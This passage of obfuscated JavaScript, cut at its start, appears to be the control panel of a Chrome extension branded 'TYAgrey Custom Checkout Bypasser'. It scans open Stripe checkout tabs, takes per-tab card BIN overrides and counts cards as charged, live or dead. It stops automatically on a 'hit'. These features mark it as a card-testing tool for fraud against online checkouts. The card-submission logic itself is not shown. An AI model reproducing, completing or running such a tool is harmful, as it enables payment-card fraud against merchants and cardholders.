      } else {
        await _0x36578b();
      }
    });
  }
  if (_0x51c2ca) {
    _0x51c2ca.addEventListener("click", async function (_0x35415f) {
      _0x35415f.preventDefault();
      _0x35415f.stopPropagation();
      await _0x36578b();
    });
  }
  if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.onMessage) {
    chrome.runtime.onMessage.addListener((_0x3a42a2, _0x481119, _0x12fd58) => {
      if (_0x3a42a2.type === "CUSTOM_CHECKOUT_STATS_UPDATE") {
        const _0x435509 = _0x3a42a2.stats || {};
        if (_0x2b73b3) {
          _0x2b73b3.textContent = _0x435509.total || 0;
        }
        if (_0x5464f3) {
          _0x5464f3.textContent = _0x435509.charged || 0;
        }
        if (_0x49aca0) {
          _0x49aca0.textContent = _0x435509.live || 0;
        }
        if (_0x15ba15) {
          _0x15ba15.textContent = _0x435509.dead || 0;
        }
        localStorage.setItem("tyagrey_cc_stats", JSON.stringify({
          total: _0x435509.total || 0,
          charged: _0x435509.charged || 0,
          live: _0x435509.live || 0,
          dead: _0x435509.dead || 0
        }));
        _0x12fd58({
          received: true
        });
        return true;
      }
      if (_0x3a42a2.type === "CUSTOM_CHECKOUT_AUTO_STOP") {
        _0x1c671e = false;
        localStorage.setItem("tyagrey_cc_started", "false");
        _0x34a624({
          [_0x439922.CC_STARTED]: "false"
        });
        _0x1afab3(false);
        _0x3ff9f8("Custom Checkout Bypasser stopped automatically - Hit found!", "success");
        console.log("[TYAgrey][CustomCheckout] Auto-stopped due to hit");
      }
      if (_0x3a42a2.type === "CUSTOM_CHECKOUT_STATUS") {
        _0x1c671e = !!_0x3a42a2.started;
        _0x1afab3(_0x1c671e);
        _0x12fd58({
          received: true
        });
        return true;
      }
    });
  }
  document.querySelectorAll(".cc-select-all-btn, .cc-unselect-all-btn").forEach(_0x2e273a => {
    const _0x5b0981 = function (_0x2d64c8) {
      _0x2d64c8.preventDefault();
      _0x2d64c8.stopPropagation();
      const _0x346fbb = this.getAttribute("data-target");
      const _0x1e9093 = document.getElementById(_0x346fbb);
      if (!_0x1e9093) {
        return;
      }
      const _0x2274ba = this.classList.contains("cc-select-all-btn");
      const _0x15bee7 = _0x1e9093.querySelectorAll("input[type=\"checkbox\"]");
      _0x15bee7.forEach(_0x19198f => {
        _0x19198f.checked = _0x2274ba;
      });
      _0x52b61d();
      this.style.transform = "scale(0.95)";
      setTimeout(() => {
        this.style.transform = "";
      }, 100);
    };
    _0x2e273a.addEventListener("click", _0x5b0981);
    _0x2e273a.addEventListener("touchend", _0x5b0981);
  });
  document.querySelectorAll(".cc-gateway-row").forEach(_0x2c2f35 => {
    const _0x2f2e47 = function (_0x37c864) {
      if (_0x37c864.target.tagName === "INPUT") {
        return;
      }
      const _0x453a4a = this.querySelector("input[type=\"checkbox\"]");
      if (_0x453a4a) {
        _0x453a4a.checked = !_0x453a4a.checked;
        _0x52b61d();
        this.style.backgroundColor = "rgba(125, 211, 252, 0.1)";
        setTimeout(() => {
          this.style.backgroundColor = "";
        }, 150);
      }
    };
    _0x2c2f35.addEventListener("click", _0x2f2e47);
    _0x2c2f35.addEventListener("touchend", _0x2f2e47);
  });
  document.querySelectorAll(".cc-toggle").forEach(_0x1be253 => {
    const _0x3d9fce = function (_0x3fc311) {
      const _0x60e486 = this.querySelector("input[type=\"checkbox\"]");
      if (_0x60e486 && !_0x60e486.disabled) {
        this.style.transform = "scale(0.98)";
        setTimeout(() => {
          this.style.transform = "";
        }, 100);
      }
    };
    _0x1be253.addEventListener("touchend", _0x3d9fce);
  });
  const _0x55bf79 = document.getElementById("cc-tabs-list");
  const _0x325220 = document.getElementById("cc-tabs-actions");
  const _0x31a65d = document.getElementById("cc-select-all-btn");
  const _0x555252 = document.getElementById("cc-refresh-tabs-btn");
  const _0x578367 = document.getElementById("cc-show-all-tabs-btn");
  function _0x2f3a0e(_0x4d18db) {
    if (!_0x4d18db) {
      return "";
    }
    const _0x312e6e = document.createElement("div");
    _0x312e6e.textContent = _0x4d18db;
    return _0x312e6e.innerHTML;
  }
  function _0x277bb1(_0x15c60f = false) {
    return new Promise(_0x25cc6d => {
      console.log("[TYAgrey][scanForStripeTabs] Starting scan, showAll:", _0x15c60f);
      if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
        console.error("[TYAgrey][scanForStripeTabs] Chrome API not available");
        _0x25cc6d({
          success: false,
          tabs: [],
          error: "Extension API not available"
        });
        return;
      }
      chrome.runtime.sendMessage({
        type: "SCAN_STRIPE_TABS",
        showAll: _0x15c60f
      }, _0xde897c => {
        if (chrome.runtime.lastError) {
          console.error("[TYAgrey][scanForStripeTabs] Chrome runtime error:", chrome.runtime.lastError);
          _0x25cc6d({
            success: false,
            tabs: [],
            error: chrome.runtime.lastError.message
          });
        } else {
          console.log("[TYAgrey][scanForStripeTabs] Response received:", _0xde897c);
          _0x25cc6d(_0xde897c || {
            success: false,
            tabs: []
          });
        }
      });
    });
  }
  function _0x3a52f3(_0x5c100e) {
    if (!_0x55bf79) {
      return;
    }
    if (_0x5c100e.length === 0) {
      _0x55bf79.innerHTML = "<div class=\"cc-tabs-empty\">No checkout pages found.<br>Open some checkout links and scan again.</div>";
      if (_0x325220) {
        _0x325220.style.display = "none";
      }
      return;
    }
    _0x3627b2 = _0x5c100e;
    _0x55bf79.innerHTML = _0x5c100e.map(_0x14b3e6 => {
      const _0x532335 = _0x2efea1[_0x14b3e6.id] || "";
      const _0x529e73 = _0x19a3bd.has(_0x14b3e6.id);
      let _0x4daca2 = "";
      try {
        _0x4daca2 = new URL(_0x14b3e6.url).hostname.replace(/^www\./, "");
      } catch (_0x238602) {
        _0x4daca2 = _0x14b3e6.url.substring(0, 30);
      }
      const _0xf92136 = _0x2f3a0e(_0x14b3e6.merchantName || _0x4daca2);
      return "\n      <div class=\"cc-tab-item " + (_0x529e73 ? "selected" : "") + "\" data-tab-id=\"" + _0x14b3e6.id + "\">\n        <div class=\"cc-tab-left-section\">\n          <input type=\"checkbox\" class=\"cc-tab-checkbox\" data-tab-id=\"" + _0x14b3e6.id + "\" " + (_0x529e73 ? "checked" : "") + ">\n          <img class=\"cc-tab-favicon\" src=\"" + (_0x14b3e6.favicon || "icons/icon16.png") + "\" onerror=\"this.src='icons/icon16.png'\">\n          <div class=\"cc-tab-info\" title=\"" + _0x2f3a0e(_0x14b3e6.url) + "\">\n            <div class=\"cc-tab-merchant\">" + _0xf92136 + "</div>\n            <div class=\"cc-tab-url\">" + _0x2f3a0e(_0x14b3e6.url.substring(0, 55)) + (_0x14b3e6.url.length > 55 ? "..." : "") + "</div>\n          </div>\n        </div>\n        <div class=\"cc-tab-right-section\">\n          <input type=\"text\" class=\"cc-tab-bin\" data-tab-id=\"" + _0x14b3e6.id + "\" placeholder=\"BIN\" value=\"" + _0x2f3a0e(_0x532335) + "\" title=\"Optional: per-tab BIN override\">\n        </div>\n      </div>\n    ";
    }).join("");
    _0x55bf79.querySelectorAll(".cc-tab-item").forEach(_0x2a2478 => {
      const _0x11cfde = Number(_0x2a2478.getAttribute("data-tab-id"));
      _0x2a2478.addEventListener("click", _0x263651 => {
        const _0x1b5a1b = _0x263651.target;
        if (_0x1b5a1b.tagName === "INPUT" && _0x1b5a1b.classList.contains("cc-tab-checkbox")) {
          return;
        }
        if (_0x1b5a1b.tagName === "INPUT" && _0x1b5a1b.classList.contains("cc-tab-bin")) {
          return;
        }
        if (_0x1b5a1b.closest(".cc-tab-checkbox") || _0x1b5a1b.closest(".cc-tab-bin")) {
          return;
        }
        _0x3015ca(_0x11cfde);
      });
      const _0x42df15 = _0x2a2478.querySelector(".cc-tab-checkbox");
      if (_0x42df15) {
        _0x42df15.addEventListener("click", _0x476ebd => {
          _0x476ebd.stopPropagation();
        });
        _0x42df15.addEventListener("change", _0x59a0a6 => {
          _0x59a0a6.stopPropagation();
          _0x3015ca(_0x11cfde, _0x42df15.checked);
        });
      }
      const _0x58ef3f = _0x2a2478.querySelector(".cc-tab-bin");
      if (_0x58ef3f) {
        _0x58ef3f.addEventListener("click", _0x3e5c4c => {
          _0x3e5c4c.stopPropagation();
        });
        _0x58ef3f.addEventListener("input", () => {
          _0x2efea1[_0x11cfde] = _0x58ef3f.value;
        });
      }
    });
    if (_0x325220) {
      _0x325220.style.display = "flex";
    }
  }
  function _0x3015ca(_0x5a45ec, _0x1a7087) {
    const _0x507754 = document.querySelector(".cc-tab-item[data-tab-id=\"" + _0x5a45ec + "\"]");
    const _0x2ae2af = _0x507754?.querySelector(".cc-tab-checkbox");
    if (_0x1a7087 === undefined) {
      if (_0x19a3bd.has(_0x5a45ec)) {
        _0x19a3bd.delete(_0x5a45ec);
        if (_0x507754) {
          _0x507754.classList.remove("selected");
        }
        if (_0x2ae2af) {
          _0x2ae2af.checked = false;
        }
      } else {
        _0x19a3bd.add(_0x5a45ec);
        if (_0x507754) {
          _0x507754.classList.add("selected");
        }
        if (_0x2ae2af) {
          _0x2ae2af.checked = true;
        }
      }
    } else if (_0x1a7087) {
      _0x19a3bd.add(_0x5a45ec);
      if (_0x507754) {
        _0x507754.classList.add("selected");
      }
    } else {
      _0x19a3bd.delete(_0x5a45ec);
      if (_0x507754) {
        _0x507754.classList.remove("selected");
      }
    }
  }
  async function _0xe0c4a0() {
    if (_0x3f62ec) {
      clearInterval(_0x3f62ec);
    }
    console.log("[TYAgrey][AutoSync] Performing initial scan...");
    if (_0x55bf79) {
      _0x55bf79.innerHTML = "<div class=\"cc-tabs-loading\">🔍 Scanning for checkout pages...</div>";
    }
    const _0x56ea9b = await _0x277bb1();
    if (_0x56ea9b.success) {
      _0x3a52f3(_0x56ea9b.tabs);
      _0x3e2498 = _0x56ea9b.tabs.length;
      console.log("[TYAgrey][AutoSync] Initial scan found", _0x56ea9b.tabs.length, "checkout tabs");
    } else {
      console.log("[TYAgrey][AutoSync] Initial scan failed:", _0x56ea9b.error);
      if (_0x55bf79) {
        _0x55bf79.innerHTML = "<div class=\"cc-tabs-empty\">⚠️ Scan failed. Try clicking \"Show All\" to debug.</div>";
      }
    }
    _0x3f62ec = setInterval(async () => {
      const _0x9ae186 = await _0x277bb1();
      if (_0x9ae186.success) {
        const _0x5bda89 = _0x9ae186.tabs.length;
        if (_0x5bda89 !== _0x3e2498) {
          const _0x4edd1b = _0x5bda89 > _0x3e2498;
          _0x3a52f3(_0x9ae186.tabs);
          _0x3e2498 = _0x5bda89;
          const _0x1c0602 = new Set(_0x9ae186.tabs.map(_0x316d19 => _0x316d19.id));
          for (const _0x58ff25 of Array.from(_0x19a3bd)) {
            if (!_0x1c0602.has(_0x58ff25)) {
              _0x19a3bd.delete(_0x58ff25);
            }
          }
          if (_0x4edd1b) {
            _0x3ff9f8("New checkout page detected! Total: " + _0x5bda89, "success");
          }
        }
      }
    }, 5000);
  }
  function _0xa8cecd() {
    if (_0x3f62ec) {
      clearInterval(_0x3f62ec);
      _0x3f62ec = null;
    }
  }
  function _0xba56f9() {
    const _0x2c6d5a = document.getElementById("panel-custom-checkout");
    if (!_0x2c6d5a) {
      return;
    }
    const _0xdd86e3 = new MutationObserver(_0x377069 => {
      _0x377069.forEach(_0x8cf18 => {
        if (_0x8cf18.type === "attributes" && _0x8cf18.attributeName === "class") {
          if (_0x2c6d5a.classList.contains("active")) {
            _0xe0c4a0();
          } else {
            _0xa8cecd();
          }
        }
      });
    });
    _0xdd86e3.observe(_0x2c6d5a, {
      attributes: true
    });
    if (_0x2c6d5a.classList.contains("active")) {
      _0xe0c4a0();
    }
  }
  _0xba56f9();
  if (_0x31a65d) {
    _0x31a65d.addEventListener("click", () => {
      const _0x22aef4 = _0x19a3bd.size === _0x3627b2.length;
      if (_0x22aef4) {
        _0x19a3bd.clear();
        document.querySelectorAll(".cc-tab-item").forEach(_0x169e9b => {
          _0x169e9b.classList.remove("selected");
          const _0x212f29 = _0x169e9b.querySelector("input[type=\"checkbox\"]");
          if (_0x212f29) {
            _0x212f29.checked = false;
          }
        });
        _0x31a65d.textContent = "Select All";
      } else {
        _0x3627b2.forEach(_0x278b55 => _0x19a3bd.add(_0x278b55.id));
        document.querySelectorAll(".cc-tab-item").forEach(_0x262401 => {
          _0x262401.classList.add("selected");
          const _0x3e9606 = _0x262401.querySelector("input[type=\"checkbox\"]");
          if (_0x3e9606) {
            _0x3e9606.checked = true;
          }
        });
        _0x31a65d.textContent = "Deselect All";
      }
    });
  }
  if (_0x555252) {
    _0x555252.addEventListener("click", async () => {
      _0x555252.textContent = "🔄 Scanning...";
      _0x555252.disabled = true;
      console.log("[TYAgrey][Refresh] Manual refresh triggered");
      const _0x13cae6 = await _0x277bb1();
      console.log("[TYAgrey][Refresh] Scan result:", _0x13cae6);
      if (_0x13cae6.success) {
        _0x3a52f3(_0x13cae6.tabs);
        _0x3e2498 = _0x13cae6.tabs.length;
        _0x3ff9f8("Found " + _0x13cae6.tabs.length + " checkout tab(s)", "success");
      } else {
        _0x3ff9f8("Scan failed: " + (_0x13cae6.error || "Unknown error"), "error");
      }
      _0x555252.textContent = "🔄 Refresh";
      _0x555252.disabled = false;
    });
  }
  if (_0x578367) {
    _0x578367.addEventListener("click", async () => {
      _0x578367.textContent = "Loading...";
      _0x578367.disabled = true;
      if (_0x55bf79) {
        _0x55bf79.innerHTML = "<div class=\"cc-tabs-loading\">Loading all open tabs...</div>";
      }
      const _0x5950a5 = await _0x277bb1(true);
      _0x578367.textContent = "Show All";
      _0x578367.disabled = false;
      if (_0x5950a5.success) {
        _0x3a52f3(_0x5950a5.tabs);
        _0x3ff9f8("Showing all " + _0x5950a5.tabs.length + " tab(s)", "info");
      } else if (_0x55bf79) {
        _0x55bf79.innerHTML = "<div class=\"cc-tabs-empty\">Error: " + _0x2f3a0e(_0x5950a5.error || "Failed to load tabs") + "</div>";
      }
    });
  }
  function _0x2d828a() {
    _0x1a1d3b().then(() => {
      _0x52f434();
      console.log("[TYAgrey][CustomCheckout] Initialized");
    });
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", _0x2d828a);
  } else {
    _0x2d828a();
  }
  if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.onChanged) {
    chrome.storage.onChanged.addListener(function (_0x52fbe7, _0x5d29d3) {
      if (_0x5d29d3 === "local" && _0x52fbe7.tyagrey_role) {
        var _0x2bc949 = _0x52fbe7.tyagrey_role.newValue || "user";
        if (_0x2bc949 !== _0x5efb32) {
          console.log("[TYAgrey][CustomCheckout] Role changed from", _0x5efb32, "to", _0x2bc949);
          _0x5efb32 = _0x2bc949;
          _0x54462b();
        }
      }
    });
  }
  window.CustomCheckoutBypasser = {
    loadSettings: _0x1a1d3b,
    saveSettings: _0x52b61d,
    start: _0x5625c7,
    stop: _0x5807f9,
    getSettings: () => _0x52b61d(),
    isRunning: () => _0x1c671e,
    getParsedList: () => _0x43b02c
  };
})();
